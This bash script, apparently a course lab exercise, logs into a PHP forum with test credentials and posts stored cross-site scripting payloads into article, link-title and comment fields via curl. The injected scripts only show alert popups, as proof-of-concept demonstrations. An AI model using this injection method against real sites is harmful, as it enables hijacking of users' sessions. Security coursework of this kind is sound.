#!/bin/bash

if [ $# -ne 2 ]; then
	PREFIX="ugster21.student.cs.uwaterloo.ca/sdsuo"
else
	IP=$1
	PORT=$2
	PREFIX=$IP:$PORT
fi

POST_PAGE="$PREFIX/post.php"
HOME_PAGE="$PREFIX/index.php"
USERNAME="alice"
PASSWORD="passw0rd"

echo "=====[Setup]====="
echo "Using Login Page at: $POST_PAGE"
echo "Using Home Page at: $HOME_PAGE"
echo "Using username: $USERNAME"
echo "Using password: $PASSWORD"

echo "=====[Login]====="
echo "Logging in with POST request"

curl -X POST \
-c "cookie.txt" \
-F "form=login" \
-F "submit=Login" \
-F "username=$USERNAME" \
-F "password=$PASSWORD" \
$POST_PAGE

ARTICLE_TYPE=1
LINK_TYPE=2

echo "=====[Attack on Article]====="
ARTICLE_POPUP="'<script type='text/javascript'> window.onload = function () {alert('Popup from content field of article post'); }</script>'"
ARTICLE_TITLE="Attack on content field of article post"

curl -X POST \
-b "cookie.txt" \
-F "form=content" \
-F "submit=Post" \
-F "title=$ARTICLE_TITLE" \
-F "content=$ARTICLE_POPUP" \
-F "type=$ARTICLE_TYPE" \
$POST_PAGE

echo "=====[Attack on Link]====="
LINK_CONTENT="Attack on title field of link post"
LINK_POPUP="'<script type='text/javascript'> window.onload = function () {alert('Popup from title field of link post'); }</script>'"

curl -X POST \
-b "cookie.txt" \
-F "form=content" \
-F "submit=Post" \
-F "title=$LINK_POPUP" \
-F "content=$LINK_CONTENT" \
-F "type=$LINK_TYPE" \
$POST_PAGE

echo "=====[Attack on Comment]====="
COMMENT_POPUP="'<script type='text/javascript'> window.onload = function () {alert('Popup from comment'); }</script>'"
COMMENT_PARENT=1
COMMENT_UID=7

curl -X POST \
-b "cookie.txt" \
-F "form=comment" \
-F "submit=Post" \
-F "parent=$COMMENT_PARENT" \
-F "uid=$COMMENT_UID" \
-F "comment=$COMMENT_POPUP" \
$POST_PAGE

echo "=====[Index Page]====="
echo "Showing index page with GET request"
curl -b "cookie.txt" $HOME_PAGE
